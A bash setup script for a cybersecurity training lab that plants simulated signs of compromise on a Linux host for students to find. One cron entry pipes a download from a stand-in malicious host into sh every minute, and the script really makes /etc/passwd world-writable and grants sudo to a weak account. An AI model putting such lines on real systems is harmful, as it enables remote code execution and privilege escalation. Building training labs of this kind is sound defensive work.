#!/bin/bash

# Script: setup_cyber_lab1.sh
# Description: Prepares a Linux lab environment for cybersecurity training
# Creates users, files, processes, and logs to simulate a compromised system

# Ensure script is run as root
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root. Use sudo." >&2
    exit 1
fi

echo "Setting up Cybersecurity Lab Environment..."
sleep 2

# Create suspicious users
echo "Creating user accounts..."
useradd -m -s /bin/bash hacker 2>/dev/null
echo "hacker:Password123" | chpasswd
useradd -m -s /bin/bash cryptominer 2>/dev/null
echo "cryptominer:CoinMine!" | chpasswd

# Add hacker to sudoers (simulating privilege escalation)
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers.d/10-hacker

# Create normal user for students to investigate
useradd -m -s /bin/bash employee 2>/dev/null
echo "employee:SecurePass1" | chpasswd

# Create suspicious files in various locations
echo "Creating challenge files..."
# Base64 encoded secret message
echo "VGhlIHNlY3JldCBpcyB0aGF0IHRoZSBtYWx3YXJlIGlzIGluIC9ldGMvc3NoL3NzaGRfY29uZmln" > /opt/secret.message

# Malicious-looking scripts
cat << 'EOF' > /tmp/backdoor.sh
#!/bin/bash
# This looks malicious but is actually harmless for the lab
while true; do
    echo "[$(date)] Backdoor running..." >> /var/log/backdoor.log
    sleep 60
done
EOF
chmod +x /tmp/backdoor.sh

# Hidden directory with "stolen" data
mkdir -p /var/lib/.hidden_data
dd if=/dev/urandom of=/var/lib/.hidden_data/credit_cards.dat bs=1M count=1 2>/dev/null

# Set insecure permissions
chmod 777 /tmp/backdoor.sh
chmod o+w /etc/passwd

# Create suspicious processes
echo "Launching background processes..."
nohup /tmp/backdoor.sh >/dev/null 2>&1 &
nohup sleep infinity >/dev/null 2>&1 &

# Generate fake log entries
echo "Generating fake log entries..."
for i in {1..20}; do
    echo "Failed password for root from 192.168.1.$i port 22 ssh2" >> /var/log/auth.log
    echo "Accepted password for hacker from 10.0.2.$i port 22 ssh2" >> /var/log/auth.log
done

# Create cryptocurrency mining simulation
cat << 'EOF' > /usr/local/bin/xmrig
#!/bin/bash
echo "Mining cryptocurrency... (just kidding, this is a simulation)"
while true; do
    echo "[$(date)] Mining fake coins..." >> /var/log/xmrig.log
    sleep 30
done
EOF
chmod +x /usr/local/bin/xmrig
nohup /usr/local/bin/xmrig >/dev/null 2>&1 &

# Create suspicious cron jobs
echo "Creating cron jobs..."
(crontab -l -u hacker 2>/dev/null; echo "* * * * * curl http://malicious.site/update.sh | sh") | crontab -u hacker -
(crontab -l -u root 2>/dev/null; echo "0 3 * * * /usr/local/bin/backup_data.sh") | crontab -u root -

# Create a fake SSH key in another user's directory
mkdir -p /home/employee/.ssh
ssh-keygen -t rsa -f /home/employee/.ssh/id_rsa -N "" -q
cp /home/employee/.ssh/id_rsa.pub /home/hacker/.ssh/authorized_keys

# Set some files with recent modification times
touch -d "2 days ago" /tmp/backdoor.sh
touch -d "1 hour ago" /var/lib/.hidden_data/credit_cards.dat

echo ""
echo "Lab environment setup complete!"
echo "Here are some clues for students:"
echo "1. There's a base64-encoded secret message somewhere"
echo "2. Check for unusual processes running"
echo "3. Look for users who shouldn't have sudo access"
echo "4. Investigate recent file modifications"
echo "5. Check cron jobs for suspicious activity"